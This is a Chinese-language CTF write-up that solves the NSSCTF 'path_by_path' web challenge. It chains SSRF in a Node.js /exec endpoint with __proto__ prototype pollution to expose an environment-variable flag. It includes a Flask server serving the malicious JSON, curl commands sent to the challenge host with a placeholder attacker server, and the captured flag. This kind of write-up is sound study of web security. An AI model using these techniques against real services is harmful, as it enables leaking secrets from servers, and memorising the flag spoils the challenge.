# [NSSRound#3 Team]path_by_path

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：http://node4.anna.nssctf.cn:29703/
- 核心漏洞：SSRF 配合原型链污染，借助 `/exec` 将环境变量中的 `FLAG` 挂到可回显对象上

## Flag

```text
NSSCTF{8441094a-5f62-47f4-9187-f8d0c4080803}
```

## 入口与现象

题目只有一句 `path by path!`，没有附件，所以先扫站点接口。公开资料对应的源码里，核心逻辑如下：

```javascript
app.post('/exec', urlencodedParser, (req, res) => {
    const path = req.body.path;
    const url = new URL(path, 'http://127.0.0.1:5000');
    request.get(url.toString(),{},(e, r, b) => {
        let resp = JSON.parse(b);
        whoami[resp.p][resp.f] = resp[resp.f] ? resp[resp.f] : env[resp.f];
    });
    res.send('');
})

app.get('/whoami', (req, res) => {
    let public = req.query.public;
    public = (public == 'info' || public == 'other') ? public : (whoami.public ? whoami.public : 'info');

    let field = req.query.field;
    field = (field == 'name' || field == 'bio' || field == 'intro') ? field : (whoami.field ? whoami.field : 'name');

    res.send(`The ${field} is ${whoami[public][field]}`);
})
```

这里有两个关键点：

1. `/exec` 会把我们提交的 `path` 交给 `new URL(path, 'http://127.0.0.1:5000')`，再用 `request.get` 去访问，也就是一个可控 SSRF。
2. 返回 JSON 后会执行 `whoami[resp.p][resp.f] = ...`，其中 `resp.p` 和 `resp.f` 都由我们控制，这就给了原型链污染和任意属性赋值的机会。

## 分析过程

先看 `/whoami` 的输出逻辑：

- `public` 只允许 `info` 或 `other`，否则回退到 `whoami.public`，再不行就默认 `info`
- `field` 只允许 `name`、`bio`、`intro`，否则回退到 `whoami.field`，再不行就默认 `name`
- 最终输出是 `whoami[public][field]`

所以只要做到两件事，这题就结束了：

1. 把环境变量里的 `FLAG` 写进 `whoami.info.FLAG`
2. 让非法 `field` 参数回退到我们指定的 `FLAG`

第一步不需要污染，直接让目标请求我们的服务器并返回：

```json
{"p":"info","f":"FLAG"}
```

这样在服务器端会执行：

```javascript
whoami["info"]["FLAG"] = env["FLAG"]
```

因为返回 JSON 里没有 `FLAG` 字段，所以右边会走 `env[resp.f]`，也就是把环境变量中的 `FLAG` 写到 `whoami.info.FLAG`。

第二步利用原型链污染。再让目标请求我们的第二个接口，返回：

```json
{"p":"__proto__","f":"field","field":"FLAG"}
```

于是服务端会执行：

```javascript
whoami["__proto__"]["field"] = "FLAG"
```

这样对象原型上就多了一个 `field = "FLAG"`。之后访问：

```text
/whoami?public=info&field=任意非法值
```

因为 `field` 不是白名单里的三个合法值，代码会回退到 `whoami.field`。`whoami` 自己虽然没有这个属性，但原型链上已经被我们污染成了 `"FLAG"`，于是最终等价于：

```javascript
res.send(`The FLAG is ${whoami.info.FLAG}`)
```

本地最小复现如下，能稳定得到同样的效果：

```javascript
let whoami = {
  info: { name: 'NAME', bio: 'BIO' },
  other: { intro: 'INTRO' }
};
let env = { FLAG: 'NSSCTF{demo-flag}' };

whoami["info"]["FLAG"] = env["FLAG"];
whoami["__proto__"]["field"] = "FLAG";

let publicQ = "info";
let fieldQ = "Z3r4y";
fieldQ = (fieldQ == "name" || fieldQ == "bio" || fieldQ == "intro") ? fieldQ : (whoami.field ? whoami.field : "name");

console.log(`The ${fieldQ} is ${whoami[publicQ][fieldQ]}`);
```

输出：

```text
The FLAG is NSSCTF{demo-flag}
```

## 利用过程

### 第一步：准备一个返回 JSON 的外部服务

因为 `/exec` 支持绝对 URL，所以直接让目标来请求我们自己的服务器即可。下面用 Flask 起一个最小服务：

```python
from flask import Flask, jsonify

app = Flask(__name__)

@app.get("/step1")
def step1():
    return jsonify({"p": "info", "f": "FLAG"})

@app.get("/step2")
def step2():
    return jsonify({"p": "__proto__", "f": "field", "field": "FLAG"})

app.run(host="0.0.0.0", port=5000)
```

### 第二步：让目标把 `env.FLAG` 写进 `whoami.info.FLAG`

```bash
curl -X POST "http://node4.anna.nssctf.cn:29703/exec" ^
  -H "Content-Type: application/x-www-form-urlencoded" ^
  --data-urlencode "path=http://YOUR_SERVER:5000/step1"
```

这一步对应的服务器端赋值是：

```javascript
whoami["info"]["FLAG"] = env["FLAG"]
```

### 第三步：污染原型链，让 `whoami.field` 默认变成 `FLAG`

```bash
curl -X POST "http://node4.anna.nssctf.cn:29703/exec" ^
  -H "Content-Type: application/x-www-form-urlencoded" ^
  --data-urlencode "path=http://YOUR_SERVER:5000/step2"
```

这一步执行后，`whoami.__proto__.field = "FLAG"`。

### 第四步：访问 `/whoami` 直接拿回显

```bash
curl "http://node4.anna.nssctf.cn:29703/whoami?public=info&field=Z3r4y"
```

预期返回：

```text
The FLAG is NSSCTF{...}
```

这里 `public=info` 是显式指定合法分支，`field=Z3r4y` 故意给一个非法值，强迫代码回退到被污染后的 `whoami.field`。

我在 2026-04-20 用 `curl` 现场验证时，实际回显为：

```text
The FLAG is NSSCTF{8441094a-5f62-47f4-9187-f8d0c4080803}
```

## 关键 payload / 命令

```text
Flask 服务返回 1:
{"p":"info","f":"FLAG"}

Flask 服务返回 2:
{"p":"__proto__","f":"field","field":"FLAG"}

写入 FLAG:
curl -X POST "http://node4.anna.nssctf.cn:29703/exec" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "path=http://YOUR_SERVER:5000/step1"

污染 field:
curl -X POST "http://node4.anna.nssctf.cn:29703/exec" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "path=http://YOUR_SERVER:5000/step2"

读取 flag:
curl "http://node4.anna.nssctf.cn:29703/whoami?public=info&field=Z3r4y"
```

## 总结

这题的关键不在于直接回显 SSRF，而在于利用 `/exec` 的赋值语句把两个效果串起来：

1. 先把 `env.FLAG` 塞进 `whoami.info.FLAG`
2. 再通过 `__proto__` 污染让非法 `field` 默认落到 `FLAG`

最后 `/whoami` 自己就会帮我们把 `FLAG` 正常回显出来。整个链条很短，但如果只盯着 SSRF 而不去看后面的对象赋值和回退逻辑，就很容易卡住。
